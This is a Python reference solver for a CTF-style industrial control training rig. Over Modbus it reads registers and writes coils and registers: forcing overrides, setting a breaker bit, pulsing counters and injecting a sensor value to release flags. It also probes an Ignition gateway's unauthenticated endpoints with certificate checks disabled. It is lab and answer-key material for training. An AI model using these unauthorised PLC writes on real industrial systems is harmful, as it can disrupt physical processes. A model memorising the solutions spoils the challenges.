#!/usr/bin/env python3
"""
solve_training.py - reference solution / pre-event health check for the
RazorHack Training Bay (MB1-MB7, PL1-PL5, IG3's PLC side, optional IG1).

It solves each challenge the way a player would - reading the live rig, not
the secrets file - then compares what it captured with
build/training/flags_all.json if that file exists.

  pip install pymodbus
  python3 training/solver/solve_training.py --host <rig> --port 5020 \
      [--gateway http://<rig>:8088]

Run it against an idle rig: on a shared Training Bay another team's actions
can collide with the checks.
"""
import argparse
import inspect
import json
import pathlib
import ssl
import struct
import sys
import time
import urllib.request

from pymodbus.client import ModbusTcpClient

UNIT_KW = next((k for k in ("device_id", "slave", "unit")
                if k in inspect.signature(ModbusTcpClient.read_holding_registers).parameters),
               "device_id")
U = {UNIT_KW: 1}

# coils
C_BEACON, C_INNER, C_SUIT, C_OVERRIDE, C_CYCLE = 0, 8, 9, 10, 11
C_HOLD, C_PULSE, C_CRESET, C_START, C_STOP_NC, C_BRESET = 16, 17, 18, 24, 25, 30
# writable holding registers
HR_RAW, HR_BREAKERS, HR_FREQ = 1024, 1025, 1026
# diagnostics
HR_COUNT, HR_FAULT, HR_TRIP, HR_LOCKED = 730, 737, 735, 740


class Rig:
    def __init__(self, host, port):
        self.c = ModbusTcpClient(host, port=port, timeout=5)
        if not self.c.connect():
            raise SystemExit(f"cannot connect to {host}:{port}")

    def hr(self, addr, count=1):
        r = self.c.read_holding_registers(addr, count=count, **U)
        if r.isError():
            raise SystemExit(f"read HR{addr} failed: {r}")
        return r.registers

    def wr(self, addr, value):
        self.c.write_register(addr, value & 0xFFFF, **U)

    def coil(self, addr, value):
        self.c.write_coil(addr, bool(value), **U)

    def text(self, addr):
        b = bytearray()
        for v in self.hr(addr, 16):
            b += bytes([v & 0xFF, (v >> 8) & 0xFF])
        return b.split(b"\x00")[0].decode("ascii", "replace")

    def wait_text(self, addr, timeout=8.0):
        end = time.time() + timeout
        while time.time() < end:
            t = self.text(addr)
            if t.startswith("flag{"):
                return t
            time.sleep(0.2)
        return None


def s16(v):
    return v - 65536 if v >= 32768 else v


def scan_sleep(scans=3):
    time.sleep(0.1 * scans)          # the PLC task is 100 ms


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=5020)
    ap.add_argument("--breaker-bit", type=int, default=9, help="the bit named in the MB7 briefing")
    ap.add_argument("--beacon", type=int, default=1420, help="IG3 answer (hydrogen line, MHz)")
    ap.add_argument("--gateway", help="Ignition base URL for IG1, e.g. http://host:8088")
    # razorhack-2026 layout: this file is solution/training/, the build output is src/build/
    ap.add_argument("--flags", default=str(pathlib.Path(__file__).resolve().parents[2]
                                           / "src" / "build" / "training" / "flags_all.json"))
    a = ap.parse_args()
    rig = Rig(a.host, a.port)
    got = {}

    def report(name, value):
        got[name] = value
        print(f"  {name:4} {value if value else '(not captured)'}")

    print("== Modbus ==")
    report("mb1", f"flag{{{rig.hr(0)[0]}}}")
    report("mb2", rig.text(10))
    report("mb3", rig.text(200))                 # Modicon 40201 -> 0-based 200
    rig.coil(C_BEACON, True)
    report("mb4", rig.wait_text(300))
    hi, lo = rig.hr(400, 2)
    report("mb5", f"flag{{{(hi << 16) | lo}}}")
    fhi, flo = rig.hr(410, 2)
    report("mb6", f"flag{{{struct.unpack('>f', struct.pack('>HH', fhi, flo))[0]:.3f}}}")
    if rig.hr(HR_TRIP)[0]:
        rig.coil(C_BRESET, True); scan_sleep()
    word = rig.hr(HR_BREAKERS)[0]                # read ...
    rig.wr(HR_BREAKERS, word | (1 << a.breaker_bit))   # ... modify, write
    report("mb7", rig.wait_text(700))

    print("== OpenPLC logic ==")
    rig.coil(C_OVERRIDE, False)
    rig.coil(C_INNER, True)
    rig.coil(C_SUIT, True)
    rig.coil(C_CYCLE, True)
    report("pl1", rig.wait_text(600, timeout=8))

    rig.coil(C_HOLD, True)                        # hold, never release early
    report("pl2", rig.wait_text(620, timeout=9))

    if rig.hr(HR_FAULT)[0] or rig.hr(HR_COUNT)[0]:
        rig.coil(C_CRESET, True); scan_sleep()
    for _ in range(7):                           # each level held >= 3 scans
        rig.coil(C_PULSE, True);  scan_sleep()
        rig.coil(C_PULSE, False); scan_sleep()
    print(f"       (counter reads {rig.hr(HR_COUNT)[0]})")
    report("pl3", rig.wait_text(640, timeout=6))

    rig.coil(C_STOP_NC, True)                     # NC stop: TRUE = not pressed
    rig.coil(C_START, True);  scan_sleep()
    rig.coil(C_START, False)                      # release; seal-in holds it
    report("pl4", rig.wait_text(660, timeout=7))

    raw = round(6554 + 0.625 * (32767 - 6554))    # 62.5 % of the 4-20 mA span
    rig.wr(HR_RAW, raw)
    report("pl5", rig.wait_text(680, timeout=6))

    print("== Ignition ==")
    rig.wr(HR_FREQ, a.beacon)
    scan_sleep()
    locked = rig.hr(HR_LOCKED)[0] == 1
    print(f"  ig3  PLC side {'LOCKED - flag now shows on the Training HMI for 30 s' if locked else 'NOT locked'}")

    expected = {}
    if pathlib.Path(a.flags).exists():
        expected = json.loads(pathlib.Path(a.flags).read_text())

    if a.gateway:
        # the text between "flag{" and "}" (any prefix: was RH{...} once)
        name = expected["ig1"].split("{", 1)[1][:-1] if expected.get("ig1") else None
        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        found = None
        for path in ("/system/gwinfo", "/gwinfo", "/StatusPing", "/web/home", "/"):
            try:
                body = urllib.request.urlopen(a.gateway.rstrip("/") + path, timeout=5, context=ctx).read().decode("utf-8", "replace")
            except Exception as e:
                print(f"  ig1  {path:15} -> {type(e).__name__}")
                continue
            hit = name and name in body
            print(f"  ig1  {path:15} -> {len(body)} bytes{'  [gateway name present]' if hit else ''}")
            if hit and not found:
                found = path
        if found:
            report("ig1", f"flag{{{name}}}")
            print(f"       name exposed unauthenticated at {found}")
        else:
            print("  ig1  name NOT found on unauthenticated endpoints - see SOLUTIONS.md fallback")

    rig.c.close()
    if expected:
        print("\n== check against flags_all.json ==")
        bad = 0
        for k, v in got.items():
            ok = v == expected.get(k)
            bad += not ok
            print(f"  {k:4} {'OK ' if ok else 'BAD'}")
        if not locked:
            bad += 1
            print("  ig3  BAD (PLC never confirmed the frequency)")
        print("\nrig healthy" if bad == 0 else f"\n{bad} problem(s)")
        sys.exit(1 if bad else 0)


if __name__ == "__main__":
    main()
